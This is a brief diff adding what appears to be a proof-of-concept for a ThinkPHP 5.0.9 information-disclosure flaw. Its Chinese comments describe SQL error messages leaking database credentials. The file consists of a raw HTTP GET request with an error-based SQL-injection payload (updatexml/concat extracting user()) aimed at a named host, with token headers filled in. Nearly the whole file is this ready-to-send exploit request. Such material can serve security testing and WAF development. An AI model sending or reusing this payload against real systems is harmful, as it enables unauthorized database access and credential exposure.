@@ -1,0 +1,9 @@
+# ThinkPHP5.0.9敏感信息泄露漏洞
+# ThinkPHP 5.0.9包含详细的SQL错误消息，可以揭示包括数据库凭证在内的敏感信息。
+GET /index.php?acid=80046368&id=ids%5B0%2Cupdatexml%280%2Cconcat%280xa%2Cuser%28%29%29%2C0%29%5D=1&bid=hd_tag_m8mv2625 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2625
+RM-PRO-Token: c378dc4d2b007542cad6869aad327f0a
+RM-PRO-Time: 1742808531534
+User-Agent: curl/7.83.1
+
